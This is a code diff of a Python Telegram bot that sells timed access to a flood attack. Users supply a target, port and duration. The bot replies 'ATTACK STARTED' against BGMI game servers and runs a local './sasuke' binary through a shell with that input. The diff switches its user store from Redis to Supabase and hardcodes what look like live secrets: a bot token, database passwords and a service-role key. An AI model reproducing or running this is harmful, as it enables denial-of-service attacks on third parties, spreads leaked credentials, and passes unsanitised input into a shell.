@@ -10,64 +10,84 @@ import sys
 import time 
 import logging
 import socket
-import asyncio
 import pytz  # Import pytz for timezone handling
-
-bot = telebot.TeleBot('7599785141:AAHuEi4nik5vPSMDZ_g3jFlWeKTzRO53v6Y')
-
-# Admin user IDs
+from supabase import create_client, Client
+import psycopg2
 admin_id = ["7418099890"]
 admin_owner = ["7418099890"]
 os.system('chmod +x *')
-# File to store allowed user IDs and their expiration times
-USER_FILE = "users.txt"
-cooldown_timestamps = {}
-# File to store command logs
-import redis
-import redis
 
-redis_client = redis.Redis(
-  host='redis-19547.c330.asia-south1-1.gce.redns.redis-cloud.com',
-  port=19547,
-  password='9lKTBrMRnxCOkjOtaHNPsXNQo0OaoibV')
-# Initialize Redis client
-# Set Indian Standard Time (IST)
+import os
+url = os.getenv("https://yxffpwhflqaapiwcpknf.supabase.co")
+key = os.getenv("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ")
+
+# Supabase credentials (replace with your actual credentials)
+url = "https://yxffpwhflqaapiwcpknf.supabase.co"  # Supabase project URL
+key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ"  # Supabase anonymous API key
+supabase: Client = create_client(url, key)
+
+bot = telebot.TeleBot('7599785141:AAHuEi4nik5vPSMDZ_g3jFlWeKTzRO53v6Y')
+
+# Setup timezone (IST)
 IST = pytz.timezone('Asia/Kolkata')
 
-# Absolute path to the ak.bin file (modify this to point to the correct path)
-AK_BIN_PATH = 'KALUAA'
+# Database connection details
+connection = psycopg2.connect(
+    host="aws-0-ap-south-1.pooler.supabase.com",
+    database="postgres",
+    user="postgres.yxffpwhflqaapiwcpknf",
+    password="Uthaya$4123",
+    port=6543
+)
+cursor = connection.cursor()
 
+USER_TABLE = "users"  # Replace with your actual table name
 
-# Function to read user IDs and their expiration times from Redis
-def read_users():
-    users = {}
-    for key in redis_client.scan_iter("user:*"):
-        user_id = key.decode("utf-8").split(":")[1]  # Decode the key
-        expiration_time = redis_client.get(key).decode("utf-8")  # Decode the value
-        if expiration_time:
-            users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
-    return users
-
-# Function to save a user to Redis
+# Function to save a user to the database
 def save_user(user_id, expiration_time):
-    redis_client.set(f"user:{user_id}", expiration_time.isoformat())
-    redis_client.expireat(f"user:{user_id}", expiration_time.timestamp())  # Set TTL
+    expiration_time_str = expiration_time.strftime("%Y-%m-%d %H:%M:%S")  # Adjust format as needed
+    cursor.execute(f"INSERT INTO {USER_TABLE} (user_id, expiration_time) VALUES (%s, %s)", (user_id, expiration_time_str))
+    connection.commit()
 
-# Function to remove expired users from Redis
+# Function to read users from the database
+# Function to read users from the database
+from datetime import datetime
+import pytz
+
+# Set up the timezone (Asia/Kolkata)
+IST = pytz.timezone('Asia/Kolkata')
+
+# Function to read users from the database
+def read_users():
+    cursor.execute(f"SELECT user_id, expiration_time FROM {USER_TABLE}")
+    users = cursor.fetchall()
+    
+    # Convert expiration_time to datetime and return a dictionary of users
+    user_dict = {}
+    for user_id, expiration_time in users:
+        # Ensure expiration_time is timezone-aware
+        if expiration_time.tzinfo is None:  # Check if naive (no timezone)
+            expiration_time = IST.localize(expiration_time)  # Localize it to IST
+        
+        user_dict[user_id] = expiration_time
+    return user_dict
+
+# Function to check if a user is expired
 def remove_expired_users():
-    current_time = datetime.now(IST)
-    for key in redis_client.scan_iter("user:*"):
-        expiration_time = redis_client.get(key).decode("utf-8")  # Decode the value
-        if expiration_time:
-            exp_time = datetime.fromisoformat(expiration_time).astimezone(IST)
-            if exp_time <= current_time:
-                redis_client.delete(key)
+    current_time = datetime.now(IST)  # Get the current time in IST
+
+    users = read_users()  # Fetch users with expiration times
+    expired_users = [user_id for user_id, expiration_time in users.items() if expiration_time < current_time]
+    
+    for user_id in expired_users:
+        # Code to remove expired users from your system or notify them
+        print(f"User {user_id} has expired.")
 
 # Handler for adding a user
 @bot.message_handler(commands=['add'])
 def add_user(message):
     try:
-        remove_expired_users()  # Clear expired users before adding new ones
+        # Your logic here
         user_id = str(message.chat.id)
 
         # Ensure only admins can use the command
@@ -105,6 +125,7 @@ def add_user(message):
         logging.error(f"Error in /add command: {e}")
         bot.reply_to(message, "An error occurred while processing your request. Please try again.")
 
+
 # Handler for removing a user
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -113,24 +134,24 @@ def remove_user(message):
         command = message.text.split()
         if len(command) == 2:
             user_to_remove = command[1]
-            redis_key = f"user:{user_to_remove}"
-            if redis_client.exists(redis_key):  # Check if user exists in Redis
-                redis_client.delete(redis_key)  # Delete user from Redis
-                response = f"User {user_to_remove} removed successfully."
+            response = supabase.table(USER_TABLE).delete().match({"user_id": user_to_remove}).execute()
+            
+            # Check the response using the `data` and `error` attributes
+            if response.data:
+                response_message = f"User {user_to_remove} removed successfully."
             else:
-                response = "User not found."
+                response_message = "User not found or an error occurred."
         else:
-            response = "Please specify a user ID to remove."
+            response_message = "Please specify a user ID to remove."
     else:
-        response = "Only Admin Can Run This Command."
-    bot.reply_to(message, response)
-
+        response_message = "Only Admin Can Run This Command."
+    bot.reply_to(message, response_message)
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
     user_id = str(message.chat.id)
     if user_id in admin_owner:
-        users = read_users()  # Fetch from Redis
+        users = read_users()  # Fetch from Supabase
         response = "Authorized Users:\n"
         current_time = datetime.now(IST)
 
@@ -172,7 +193,7 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
     bot.reply_to(message, response)
 
-    full_command = f"./sasuke {target} {port} {time} 200"
+    full_command = f"./sasuke {target} {port} {time} 60"
     try:
         print(f"Executing command: {full_command}")  # Log the command
         result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
